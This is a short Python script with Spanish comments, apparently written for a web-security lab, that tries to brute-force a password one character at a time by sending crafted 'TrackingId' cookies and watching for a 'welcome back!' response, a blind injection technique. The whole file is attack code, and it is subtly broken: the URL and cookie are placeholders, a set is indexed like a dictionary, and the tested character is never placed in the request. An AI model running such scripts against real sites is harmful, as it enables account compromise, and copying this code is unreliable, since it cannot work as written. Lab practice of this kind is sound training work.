from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#ctrl+c
signal.signal(signal.SIGINT, def_handler)

main_url = "url_que_toque_en_el_lab"
characters = string.printable

def makeRecuest():
    
    password = ""

    pl = log.progress("Fuerza bruta")
    pl.status("Iniciando ataque de fuerza bruta")
    
    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(1, 21):

        for character in characters:

            cookies = {
                'cookie_del_lab'
            }
            
            pl.status(cookies['TrackingId'])

            r = requests.get(main_url, cookies=cookies)

            if "welcome back!" in r.text:
                password += character
                p2.status(password)
                break
if __name__ == '__main__':

    makeRecuest()
